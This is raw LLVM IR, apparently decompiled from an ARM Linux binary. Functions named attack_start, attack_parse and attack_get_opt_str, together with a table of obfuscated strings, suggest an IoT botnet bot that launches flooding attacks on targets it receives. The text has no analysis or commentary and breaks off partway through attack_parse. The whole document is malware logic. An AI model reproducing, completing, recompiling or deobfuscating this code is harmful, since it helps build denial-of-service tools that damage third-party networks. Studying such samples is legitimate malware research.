source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%anon_struct_4 = type { i32, i32*, i8, i8 }
%anon_struct_13 = type { i32, i32*, i8, i8 }
%anon_struct_13.3 = type { i32, i32*, i8, i8 }
%vfp_regs = type { [16 x i64], i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_22238.22 = global i32 0
@global_var_db84.26 = constant i32 -382906384
@global_var_2245c.31 = global i32 0
@global_var_831c.32 = constant i32 -352321547
@global_var_135dc.33 = constant i32 -382909968
@global_var_bd94.39 = constant i32 -382906384
@global_var_c1cc.41 = constant i32 -382906384
@global_var_b608.43 = constant i32 -382906384
@global_var_af5c.45 = constant i32 -382906384
@global_var_a864.47 = constant i32 -382906384
@global_var_a0b0.49 = constant i32 -382906384
@global_var_9040.52 = constant i32 -382906384
@global_var_89ac.54 = constant i32 -382906384
@global_var_965c.56 = constant i32 -382906384
@global_var_10000.57 = constant i32 -481099714
@global_var_24f78.59 = global i32 0
@global_var_24f80.71 = global i32 0
@global_var_19ac8.73 = constant i32 47
@global_var_c707.75 = constant [3 x i8] c"\0AH\00"
@global_var_22460.77 = global i32 0
@global_var_24f7c.79 = global i32 0
@global_var_114c0.81 = constant i32 -382910336
@global_var_d510.82 = constant i32 -509607932
@global_var_da10.84 = constant i32 -382910352
@global_var_222ec.86 = global i32 69240
@global_var_222e4.88 = global i32 -1
@global_var_24f88.94 = local_unnamed_addr global i32 0
@global_var_24f86.95 = local_unnamed_addr global i32 0
@global_var_22464.97 = global i32 0
@global_var_19acc.105 = constant i32 10
@global_var_222e8.107 = global i32 -1
@global_var_14ab0.112 = constant i32 -450904024
@global_var_10e78.113 = constant i32 -382910352
@global_var_19ad0.117 = constant i32 16777216
@global_var_2246c.119 = global i32 0
@global_var_22478.121 = global i32 0
@global_var_22470.123 = global i32 0
@global_var_22474.125 = global i32 0
@global_var_ea08.138 = constant i32 -509607925
@global_var_24f9c.140 = global i32 0
@global_var_224b0.142 = global i32 0
@global_var_2247c.144 = global i32 0
@global_var_224a8.146 = global i32 0
@global_var_24f94.153 = global i32 0
@global_var_24f98.155 = global i32 0
@global_var_22482.158 = local_unnamed_addr global i32 0
@global_var_22484.162 = local_unnamed_addr global i32 0
@global_var_22488.163 = local_unnamed_addr global i32 0
@global_var_22489.164 = local_unnamed_addr global i32 0
@global_var_224a2.167 = local_unnamed_addr global i32 0
@global_var_19adc.169 = constant i32 0
@global_var_19ad8.171 = constant [5 x i8] c"&;; \00"
@global_var_19ae0.173 = constant [5 x i8] c"5:?;\00"
@global_var_19ae8.175 = constant [9 x i8] c"<!: acam\00"
@global_var_19af4.177 = constant [8 x i8] c"0125!8 \00"
@global_var_19afc.179 = constant [9 x i8] c"$5''#;&0\00"
@global_var_19b08.181 = constant [6 x i8] c"509=:\00"
@global_var_19b10.183 = constant [6 x i8] c"\22=.,\22\00"
@global_var_19b18.185 = constant [8 x i8] c"'!$$;& \00"
@global_var_19b20.187 = constant i32 423502179
@global_var_19b30.189 = constant [6 x i8] c"efg`a\00"
@global_var_19b38.191 = constant [5 x i8] c"!'1&\00"
@global_var_19b40.193 = constant i32 943467547
@global_var_19b4c.195 = constant i32 322070023
@global_var_19b58.197 = constant [5 x i8] c"efg`\00"
@global_var_2248c.198 = local_unnamed_addr global i32 0
@global_var_2248a.199 = local_unnamed_addr global i32 0
@global_var_22490.200 = local_unnamed_addr global i32 0
@global_var_22498.202 = local_unnamed_addr global i32 0
@global_var_224a4.203 = local_unnamed_addr global i32 0
@global_var_eb18.205 = constant i32 -382910352
@global_var_19b60.207 = constant [3 x i8] c"\0D\0A\00"
@global_var_19b6c.209 = constant i32 2096127
@global_var_19b63.211 = constant i32 2095871
@global_var_24fa4.216 = global i32 0
@global_var_222f4.219 = global i32 -555811921
@global_var_19b70.224 = constant i32 48212
@global_var_24fac.225 = local_unnamed_addr global i32 0
@global_var_24fb0.226 = local_unnamed_addr global i32 0
@global_var_19b74.228 = constant [17 x i8] c"&;; '1:$5=z'= 1T\00"
@global_var_24fb4.229 = local_unnamed_addr global i32 0
@global_var_24fb8.230 = local_unnamed_addr global i32 0
@global_var_24fbc.231 = local_unnamed_addr global i32 0
@global_var_24fc0.232 = local_unnamed_addr global i32 0
@global_var_19b88.234 = constant i32 32750
@global_var_24fc4.235 = local_unnamed_addr global i32 0
@global_var_24fc8.236 = local_unnamed_addr global i32 0
@global_var_19b8c.238 = constant [28 x i8] c"-;!&t <1t9;' t35-t7!: t;! T\00"
@global_var_24fcc.239 = local_unnamed_addr global i32 0
@global_var_24fd0.240 = local_unnamed_addr global i32 0
@global_var_19ba8.242 = constant [7 x i8] c"'<188T\00"
@global_var_24fd4.243 = local_unnamed_addr global i32 0
@global_var_24fd8.244 = local_unnamed_addr global i32 0
@global_var_19bb0.246 = constant [8 x i8] c"1:5681T\00"
@global_var_24fdc.247 = local_unnamed_addr global i32 0
@global_var_24fe0.248 = local_unnamed_addr global i32 0
@global_var_19bb8.250 = constant [8 x i8] c"'-' 19T\00"
@global_var_24fe4.251 = local_unnamed_addr global i32 0
@global_var_24fe8.252 = local_unnamed_addr global i32 0
@global_var_19bc0.254 = constant [4 x i8] c"'<T\00"
@global_var_24ff0.255 = local_unnamed_addr global i32 0
@global_var_24fec.256 = local_unnamed_addr global i32 0
@global_var_19bc4.258 = constant i32 977090171
@global_var_24ff4.259 = local_unnamed_addr global i32 0
@global_var_24ff8.260 = local_unnamed_addr global i32 0
@global_var_19bd8.262 = constant i32 102440217
@global_var_24ffc.263 = local_unnamed_addr global i32 0
@global_var_25000.264 = local_unnamed_addr global i32 0
@global_var_19bf4.266 = constant [10 x i8] c":7;&&17 T\00"
@global_var_25008.267 = local_unnamed_addr global i32 0
@global_var_25004.268 = local_unnamed_addr global i32 0
@global_var_19c00.270 = constant [17 x i8] c"{6=:{6!'-6;,t$'T\00"
@global_var_2500c.271 = local_unnamed_addr global i32 0
@global_var_25010.272 = local_unnamed_addr global i32 0
@global_var_19c14.274 = constant [23 x i8] c"{6=:{6!'-6;,t?=88tymtT\00"
@global_var_25014.275 = local_unnamed_addr global i32 0
@global_var_25018.276 = local_unnamed_addr global i32 0
@global_var_19c2c.278 = constant [8 x i8] c"{$&;7{T\00"
@global_var_2501c.279 = local_unnamed_addr global i32 0
@global_var_25020.280 = local_unnamed_addr global i32 0
@global_var_19c34.282 = constant [6 x i8] c"{1,1T\00"
@global_var_25028.283 = local_unnamed_addr global i32 0
@global_var_25024.284 = local_unnamed_addr global i32 0
@global_var_19c3c.286 = constant [5 x i8] c"{20T\00"
@global_var_2502c.287 = local_unnamed_addr global i32 0
@global_var_25030.288 = local_unnamed_addr global i32 0
@global_var_19c44.290 = constant [7 x i8] c"{95$'T\00"
@global_var_25034.291 = local_unnamed_addr global i32 0
@global_var_25038.292 = local_unnamed_addr global i32 0
@global_var_19c4c.294 = constant [15 x i8] c"{$&;7{:1 { 7$T\00"
@global_var_2503c.295 = local_unnamed_addr global i32 0
@global_var_25040.296 = local_unnamed_addr global i32 0
@global_var_19c5c.298 = constant [9 x i8] c"{' 5 !'T\00"
@global_var_250b4.299 = local_unnamed_addr global i32 0
@global_var_19c68.301 = constant [8 x i8] c"z5:=91T\00"
@global_var_250bc.302 = local_unnamed_addr global i32 0
@global_var_19c70.304 = constant [17 x i8] c"{$&;7{:1 {&;! 1T\00"
@global_var_25044.305 = local_unnamed_addr global i32 0
@global_var_25048.306 = local_unnamed_addr global i32 0
@global_var_19c84.308 = constant [24 x i8] c"3e567`09;ga<:$f8=1d?>2T\00"
@global_var_2504c.309 = local_unnamed_addr global i32 0
@global_var_25050.310 = local_unnamed_addr global i32 0
@global_var_19c9c.312 = constant [9 x i8] c"5''#;&0T\00"
@global_var_25054.313 = local_unnamed_addr global i32 0
@global_var_25058.314 = local_unnamed_addr global i32 0
@global_var_19ca8.316 = constant [15 x i8] c"{01\22{#5 7<0;3T\00"
@global_var_2505c.317 = local_unnamed_addr global i32 0
@global_var_25060.318 = local_unnamed_addr global i32 0
@global_var_19cb8.320 = constant [20 x i8] c"{01\22{9='7{#5 7<0;3T\00"
@global_var_25064.321 = local_unnamed_addr global i32 0
@global_var_25068.322 = local_unnamed_addr global i32 0
@global_var_19ccc.324 = constant [11 x i8] c"0\22&<18$1&T\00"
@global_var_250c4.325 = local_unnamed_addr global i32 0
@global_var_19d30.327 = constant i32 557516544
@global_var_25070.328 = local_unnamed_addr global i32 0
@global_var_2506c.329 = local_unnamed_addr global i32 0
@global_var_19cd8.331 = constant [18 x i8] c"{1 7{&1';8\22z7;:2T\00"
@global_var_25074.332 = local_unnamed_addr global i32 0
@global_var_25078.333 = local_unnamed_addr global i32 0
@global_var_19cec.335 = constant [13 x i8] c":591'1&\221&tT\00"
@global_var_25080.336 = local_unnamed_addr global i32 0
@global_var_2507c.337 = local_unnamed_addr global i32 0
@global_var_25084.338 = local_unnamed_addr global i32 0
@global_var_25088.339 = local_unnamed_addr global i32 0
@global_var_2508c.340 = local_unnamed_addr global i32 0
@global_var_25090.341 = local_unnamed_addr global i32 0
@global_var_19cfc.343 = constant [9 x i8] c"$662*7!E\00"
@global_var_25094.344 = local_unnamed_addr global i32 0
@global_var_25098.345 = local_unnamed_addr global i32 0
@global_var_19d08.347 = constant [6 x i8] c";3=:T\00"
@global_var_2509c.348 = local_unnamed_addr global i32 0
@global_var_250a0.349 = local_unnamed_addr global i32 0
@global_var_19d10.351 = constant [7 x i8] c"1: 1&T\00"
@global_var_250a4.352 = local_unnamed_addr global i32 0
@global_var_19d18.354 = constant [24 x i8] c"e365`70;9ag:<$ef1=d?2>T\00"
@global_var_250ac.355 = local_unnamed_addr global i32 0
@global_var_2223c.361 = global i32 0
@global_var_10efc.364 = constant i32 -442695672
@global_var_10c24.376 = constant i32 -509607924
@global_var_11818.385 = constant i32 -443088884
@global_var_11cac.401 = constant i32 -456978431
@global_var_10494.408 = constant i32 -476053472
@global_var_10450.411 = constant i32 -509607928
@global_var_ffbc.438 = constant [3 x i8] c"h\08\00"
@global_var_ff38.442 = constant i32 -481099740
@global_var_fe78.444 = constant i32 -481165276
@global_var_feb8.446 = constant i32 -509607925
@global_var_1259c.453 = constant i32 -478871519
@global_var_13040.470 = constant i32 -478805983
@global_var_13428.480 = constant i32 -382906384
@global_var_15530.489 = constant i32 -442544040
@global_var_13dc0.513 = constant i32 -369098502
@global_var_14794.527 = constant i32 -382910288
@global_var_14944.539 = constant i32 -2020859901
@global_var_14a30.542 = constant i32 -494075872
@global_var_11684.543 = constant i32 -382910336
@global_var_25454.546 = local_unnamed_addr global i32 0
@global_var_13858.560 = constant i32 -442543860
@global_var_11c10.568 = constant i32 -369093146
@global_var_cd2c.593 = constant i32 -509607926
@global_var_15a28.596 = constant i32 -382910352
@global_var_caac.604 = constant i32 167772255
@global_var_16e38.619 = constant i32 -382906384
@global_var_168f8.647 = constant i32 -382910448
@global_var_182e8.648 = constant i32 -382909968
@global_var_9d5c.702 = constant i32 -442695668
@global_var_18a24.710 = constant i32 -481296376
@global_var_18b1c.711 = constant i32 -481296376
@global_var_18ba0.712 = constant i32 -369098732
@global_var_2243c.12 = external global i8*
@global_var_22458.29 = external global i8*
@global_var_22459.37 = global i8 0
@1 = internal constant [2 x i8] c"\01\00"
@global_var_222f0.90 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_24f84.93 = global i16* null
@global_var_22468.110 = external global i8*
@global_var_224ac.148 = global i16* null
@global_var_22480.157 = external global i8*
@global_var_22494.160 = global i16 0
@global_var_224a0.161 = local_unnamed_addr global i8 0
@global_var_22496.165 = local_unnamed_addr global i16 0
@global_var_224a1.166 = local_unnamed_addr global i8 0
@global_var_22294.357 = local_unnamed_addr global i16 8

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80d8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80d8)
  %v31_80e0 = load i32, i32* @r0, align 4
  ret i32 %v31_80e0
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_80f0 = load i32, i32* @r4, align 4
  store i32 %v3_80f0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_2243c.12 to i32), i32* %r4.global-to-local, align 4
  %v2_80f8 = load i8, i8* bitcast (i8** @global_var_2243c.12 to i8*), align 4
  %v2_80fc = icmp eq i8 %v2_80f8, 0
  br i1 %v2_80fc, label %dec_label_pc_8104, label %dec_label_pc_8120

dec_label_pc_8104:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_811c = load i32, i32* %r4.global-to-local, align 4
  %v3_811c = inttoptr i32 %v2_811c to i8*
  store i8 1, i8* %v3_811c, align 1
  %v2_8120.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8120

dec_label_pc_8120:                                ; preds = %entry, %dec_label_pc_8104
  %v2_8120 = phi i32 [ %v3_80f0, %entry ], [ %v2_8120.pre, %dec_label_pc_8104 ]
  store i32 %v2_8120, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_2243c.12, { 1, 0 }
  uselistorder label %dec_label_pc_8120, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8158 = load i32, i32* @global_var_22238.22, align 4
  %v2_815c = icmp eq i32 %v2_8158, 0
  br i1 %v2_815c, label %dec_label_pc_8174, label %dec_label_pc_8164

dec_label_pc_8164:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8174

dec_label_pc_8174:                                ; preds = %bb, %dec_label_pc_8164
  ret i32 ptrtoint (i32* @global_var_22238.22 to i32)

; uselistorder directives
  uselistorder i32* @global_var_22238.22, { 1, 0 }
  uselistorder label %dec_label_pc_8174, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_819c = ptrtoint i32* %stack_var_4 to i32
  %v8_81bc = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_db84.26 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32980, i32 105144, i32 %arg1, i32 %v4_819c)
  %v0_81c0 = call i32 @abort()
  ret i32 %v0_81c0
}

define i32 @attack_get_opt_str(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_81d0 = icmp eq i32 %arg1, 0
  br i1 %v2_81d0, label %dec_label_pc_8218, label %dec_label_pc_81e0

dec_label_pc_81e0:                                ; preds = %entry
  %v0_81e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_81e0 = add i32 %v0_81e0, 4
  %v2_81e0 = inttoptr i32 %v1_81e0 to i8*
  %v3_81e0 = load i8, i8* %v2_81e0, align 1
  %v4_81e0 = zext i8 %v3_81e0 to i32
  %v9_81e4 = icmp eq i32 %v4_81e0, %arg3
  br i1 %v9_81e4, label %dec_label_pc_8224, label %dec_label_pc_8208.preheader

dec_label_pc_8208.preheader:                      ; preds = %dec_label_pc_81e0
  br label %dec_label_pc_8208

dec_label_pc_81f8:                                ; preds = %dec_label_pc_8208
  %v1_81f8 = add i32 %v0_8200.in, 12
  %v2_81f8 = inttoptr i32 %v1_81f8 to i8*
  %v3_81f8 = load i8, i8* %v2_81f8, align 1
  %v4_81f8 = zext i8 %v3_81f8 to i32
  %v9_81fc = icmp eq i32 %v4_81f8, %arg3
  br i1 %v9_81fc, label %dec_label_pc_8224, label %dec_label_pc_8208

dec_label_pc_8208:                                ; preds = %dec_label_pc_8208.preheader, %dec_label_pc_81f8
  %v0_8200.in = phi i32 [ %v0_81e0, %dec_label_pc_8208.preheader ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v0_8208 = phi i32 [ 0, %dec_label_pc_8208.preheader ], [ %v1_8208, %dec_label_pc_81f8 ]
  %v0_8200 = add i32 %v0_8200.in, 8
  %v1_8208 = add i32 %v0_8208, 1
  %v9_820c = icmp eq i32 %v1_8208, %arg1
  store i32 %v0_8200, i32* %r1.global-to-local, align 4
  br i1 %v9_820c, label %dec_label_pc_8218, label %dec_label_pc_81f8

dec_label_pc_8218:                                ; preds = %dec_label_pc_8208, %entry, %dec_label_pc_8224
  %v0_8218 = phi i32 [ %arg4, %entry ], [ %v2_8224, %dec_label_pc_8224 ], [ %arg4, %dec_label_pc_8208 ]
  ret i32 %v0_8218

dec_label_pc_8224:                                ; preds = %dec_label_pc_81f8, %dec_label_pc_81e0
  %v0_8224 = phi i32 [ %v0_81e0, %dec_label_pc_81e0 ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v1_8224 = inttoptr i32 %v0_8224 to i32*
  %v2_8224 = load i32, i32* %v1_8224, align 4
  br label %dec_label_pc_8218

; uselistorder directives
  uselistorder i32 %v1_8208, { 1, 0 }
  uselistorder i32 %v0_8200, { 1, 0, 2 }
  uselistorder i32 %v0_8200.in, { 1, 0 }
  uselistorder i32 %v0_81e0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8218, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8208, { 1, 0 }
}

define i32 @attack_start(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_822c = load i32, i32* @r4, align 4
  store i32 %v3_822c, i32* %stack_var_-32, align 4
  %v6_822c = load i32, i32* @r5, align 4
  %v9_822c = load i32, i32* @r6, align 4
  %v12_822c = load i32, i32* @r7, align 4
  %v0_8230 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_8230, i32* @sb, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @sl, align 4
  %v4_8240 = sext i8 %arg5 to i32
  store i32 %v4_8240, i32* @r8, align 4
  %v0_8244 = call i32 @__libc_fork()
  %v7_8248 = icmp eq i32 %v0_8244, -1
  %. = zext i1 %v7_8248 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %tmp23 = icmp slt i32 %v0_8244, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %entry
  br label %dec_label_pc_8268

bb24:                                             ; preds = %entry
  store i32 %., i32* @r5, align 4
  %v2_8260 = icmp eq i1 %v7_8248, false
  br i1 %v2_8260, label %dec_label_pc_8270, label %dec_label_pc_8268

dec_label_pc_8268:                                ; preds = %.thread2, %bb24
  %v2_8268 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_8268, i32* @r4, align 4
  store i32 %v6_822c, i32* @r5, align 4
  store i32 %v9_822c, i32* @r6, align 4
  store i32 %v12_822c, i32* @r7, align 4
  ret i32 %v0_8244

dec_label_pc_8270:                                ; preds = %bb24
  %v0_8270 = call i32 @__libc_fork()
  %v7_8274 = icmp eq i32 %v0_8270, -1
  store i32 %v0_8270, i32* @r4, align 4
  br i1 %v7_8274, label %dec_label_pc_82a4, label %dec_label_pc_8280

dec_label_pc_8280:                                ; preds = %dec_label_pc_8270
  %v2_8280 = icmp eq i32 %v0_8270, 0
  br i1 %v2_8280, label %dec_label_pc_8288, label %dec_label_pc_82ac

dec_label_pc_8288:                                ; preds = %dec_label_pc_8280
  %v0_8288 = load i32, i32* @r6, align 4
  %v1_828c = call i32 @sleep(i32 %v0_8288)
  store i32 %v1_828c, i32* @r0, align 4
  %v0_8290 = call i32 @getppid()
  %v2_8298 = call i32 @kill(i32 %v0_8290, i32 9)
  %v0_829c = load i32, i32* @r4, align 4
  %v1_82a0 = call i32 @__GI_exit(i32 %v0_829c)
  br label %dec_label_pc_82a4

dec_label_pc_82a4:                                ; preds = %dec_label_pc_8270, %dec_label_pc_8288
  %v0_82a4 = load i32, i32* @r5, align 4
  %v1_82a8 = call i32 @__GI_exit(i32 %v0_82a4)
  br label %dec_label_pc_82ac

dec_label_pc_82ac:                                ; preds = %dec_label_pc_8280, %dec_label_pc_82a4
  store i32 ptrtoint (i8** @global_var_22458.29 to i32), i32* %r3.global-to-local, align 4
  %v2_82b0 = load i8, i8* bitcast (i8** @global_var_22458.29 to i8*), align 4
  %v3_82b0 = zext i8 %v2_82b0 to i32
  %v2_82b4 = icmp eq i8 %v2_82b0, 0
  br i1 %v2_82b4, label %dec_label_pc_82f8, label %dec_label_pc_82bc

dec_label_pc_82bc:                                ; preds = %dec_label_pc_82ac
  store i32 ptrtoint (i32* @global_var_2245c.31 to i32), i32* %r3.global-to-local, align 4
  %v2_82c0 = load i32, i32* @global_var_2245c.31, align 4
  %v1_82c4 = inttoptr i32 %v2_82c0 to i32*
  %v2_82c4 = load i32, i32* %v1_82c4, align 4
  %v1_82c8 = add i32 %v2_82c4, 4
  %v2_82c8 = inttoptr i32 %v1_82c8 to i8*
  %v3_82c8 = load i8, i8* %v2_82c8, align 1
  %v4_82c8 = zext i8 %v3_82c8 to i32
  store i32 %v4_82c8, i32* %r3.global-to-local, align 4
  %v1_82cc = load i32, i32* @r7, align 4
  %v9_82cc = icmp eq i32 %v4_82c8, %v1_82cc
  br i1 %v9_82cc, label %dec_label_pc_8300, label %dec_label_pc_82ec.preheader

dec_label_pc_82ec.preheader:                      ; preds = %dec_label_pc_82bc
  %v1_82d0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_82ec

dec_label_pc_82dc:                                ; preds = %dec_label_pc_82ec
  %v4_82dc = mul i32 %v1_82ec, 4
  %v5_82dc = add i32 %v4_82dc, %v2_82c0
  %v6_82dc = inttoptr i32 %v5_82dc to i32*
  %v7_82dc = load i32, i32* %v6_82dc, align 4
  %v1_82e0 = add i32 %v7_82dc, 4
  %v2_82e0 = inttoptr i32 %v1_82e0 to i8*
  %v3_82e0 = load i8, i8* %v2_82e0, align 1
  %v4_82e0 = zext i8 %v3_82e0 to i32
  store i32 %v4_82e0, i32* %r3.global-to-local, align 4
  %v9_82e4 = icmp eq i32 %v4_82e0, %v1_82cc
  br i1 %v9_82e4, label %dec_label_pc_8300, label %dec_label_pc_82ec

dec_label_pc_82ec:                                ; preds = %dec_label_pc_82ec.preheader, %dec_label_pc_82dc
  %v0_82ec = phi i32 [ %v1_82d0, %dec_label_pc_82ec.preheader ], [ %v1_82ec, %dec_label_pc_82dc ]
  %v1_82ec = add i32 %v0_82ec, 1
  %v9_82f0 = icmp eq i32 %v1_82ec, %v3_82b0
  br i1 %v9_82f0, label %dec_label_pc_82f8, label %dec_label_pc_82dc

dec_label_pc_82f8:                                ; preds = %dec_label_pc_82ec, %dec_label_pc_82ac, %dec_label_pc_8300
  %v1_82fc = call i32 @__GI_exit(i32 0)
  %v0_8310.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_8300

dec_label_pc_8300:                                ; preds = %dec_label_pc_82dc, %dec_label_pc_82bc, %dec_label_pc_82f8
  %v0_8310 = phi i32 [ %v2_82c4, %dec_label_pc_82bc ], [ %v0_8310.pre, %dec_label_pc_82f8 ], [ %v7_82dc, %dec_label_pc_82dc ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v1_8310 = inttoptr i32 %v0_8310 to i32*
  %v2_8310 = load i32, i32* %v1_8310, align 4
  call void @__pseudo_branch(i32 %v2_8310)
  br label %dec_label_pc_82f8

; uselistorder directives
  uselistorder i32 %v1_82ec, { 2, 0, 1 }
  uselistorder i32 %v0_8270, { 1, 2, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_8248, { 1, 0 }
  uselistorder i32 %v0_8244, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 2, 0, 1 }
  uselistorder label %dec_label_pc_8300, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82ec, { 1, 0 }
  uselistorder label %dec_label_pc_82ac, { 1, 0 }
  uselistorder label %dec_label_pc_82a4, { 1, 0 }
  uselistorder label %dec_label_pc_8268, { 1, 0 }
}

define i32 @attack_parse(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_8328 = load i32, i32* @r5, align 4
  %v9_8328 = load i32, i32* @r6, align 4
  %v12_8328 = load i32, i32* @r7, align 4
  %v18_8328 = load i32, i32* @sb, align 4
  %v21_8328 = load i32, i32* @sl, align 4
  %v24_8328 = load i32, i32* @fp, align 4
  %v2_832c = icmp ugt i32 %arg2, 2
  %v7_832c = icmp eq i32 %arg2, 3
  store i1 %v7_832c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_8338 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_8338, i32* @r5, align 4
  %v2_833c = xor i1 %v7_832c, true
  %v3_833c = and i1 %v2_832c, %v2_833c
  br i1 %v3_833c, label %dec_label_pc_834c, label %dec_label_pc_8340

dec_label_pc_8340:                                ; preds = %dec_label_pc_838c, %.dec_label_pc_8340_crit_edge, %dec_label_pc_8380, %dec_label_pc_8370, %dec_label_pc_834c, %entry, %dec_label_pc_8538
  %v1_8348 = phi i32 [ %v1_8348.pre, %.dec_label_pc_8340_crit_edge ], [ %v1_8350, %dec_label_pc_838c ], [ %v1_8350, %dec_label_pc_8380 ], [ %v1_8350, %dec_label_pc_8370 ], [ %v1_8350, %dec_label_pc_834c ], [ %v0_8338, %entry ], [ %v0_853c, %dec_label_pc_8538 ]
  store i32 %v6_8328, i32* @r5, align 4
  store i32 %v9_8328, i32* @r6, align 4
  store i32 %v12_8328, i32* @r7, align 4
  store i32 %v18_8328, i32* @sb, align 4
  store i32 %v21_8328, i32* @sl, align 4
  store i32 %v24_8328, i32* @fp, align 4
  ret i32 %v1_8348

dec_label_pc_834c:                                ; preds = %entry
  %v1_834c = inttoptr i32 %v0_8338 to i32*
  %v2_834c = load i32, i32* %v1_834c, align 4
  store i32 %v2_834c, i32* %r1.global-to-local, align 4
  %v1_8350 = and i32 %v2_834c, 16711680
  store i32 %v1_8350, i32* %r0.global-to-local, align 4
  %v3_8354 = udiv i32 %v2_834c, 16777216
  %v4_8358 = udiv i32 %v1_8350, 256
  %v5_8358 = or i32 %v4_8358, %v3_8354
  %v1_835c = and i32 %v2_834c, 65280
  store i32 %v1_835c, i32* %r2.global-to-local, align 4
  %v4_8360 = mul nuw nsw i32 %v1_835c, 256
  %v5_8360 = or i32 %v5_8358, %v4_8360
  store i32 %v5_8360, i32* %r3.global-to-local, align 4
  %v7_8364 = icmp eq i32 %arg2, 4
  store i1 %v7_8364, i1* %cpsr_z.global-to-local, align 1
  %v5_8368 = call i32 @llvm.bswap.i32(i32 %v2_834c)
  store i32 %v5_8368, i32* @fp, align 4
  br i1 %v7_8364, label %dec_label_pc_8340, label %dec_label_pc_8370

dec_label_pc_8370:                                ; preds = %dec_label_pc_834c
  %v1_8370 = add i32 %v0_8338, 4
  %v2_8370 = inttoptr i32 %v1_8370 to i8*
  %v3_8370 = load i8, i8* %v2_8370, align 1
  %v4_8370 = zext i8 %v3_8370 to i32
  store i32 %v4_8370, i32* %r2.global-to-local, align 4
  %v7_8374 = icmp eq i32 %arg2, 5
  store i1 %v7_8374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8374, label %dec_label_pc_8340, label %dec_label_pc_8380

dec_label_pc_8380:                                ; preds = %dec_label_pc_8370
  %v1_8380 = add i32 %v0_8338, 5
  %v2_8380 = inttoptr i32 %v1_8380 to i8*
  %v3_8380 = load i8, i8* %v2_8380, align 1
  %v4_8380 = zext i8 %v3_8380 to i32
  store i32 %v4_8380, i32* @sb, align 4
  %v2_8384 = icmp eq i8 %v3_8380, 0
  store i1 %v2_8384, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8384, label %dec_label_pc_8340, label %dec_label_pc_838c

dec_label_pc_838c:                                ; preds = %dec_label_pc_8380
  %v2_8390 = mul nuw nsw i32 %v4_8380, 5
  store i32 %v2_8390, i32* @r7, align 4
  %v1_8394 = add i32 %arg2, -6
  store i32 %v1_8394, i32* %r3.global-to-local, align 4
  %v3_8398 = icmp ult i32 %v1_8394, %v2_8390
